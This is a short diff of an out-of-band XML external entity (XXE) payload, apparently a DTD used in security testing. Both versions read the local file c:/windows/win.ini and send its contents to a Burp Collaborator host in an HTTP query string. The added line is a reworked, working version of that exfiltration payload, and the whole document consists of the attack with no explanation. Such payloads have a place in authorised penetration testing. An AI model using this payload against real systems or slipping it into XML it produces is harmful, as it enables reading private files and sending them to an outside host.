@@ -1,2 +1,1 @@
-<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://iugs82fih77ik3rmks4s6gkht8z0np.burpcollaborator.net/?q=%data;'>">
+<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://4gleuo143tt46pd86eqes263fuln9c.burpcollaborator.net/?x=%file;'>">%eval;
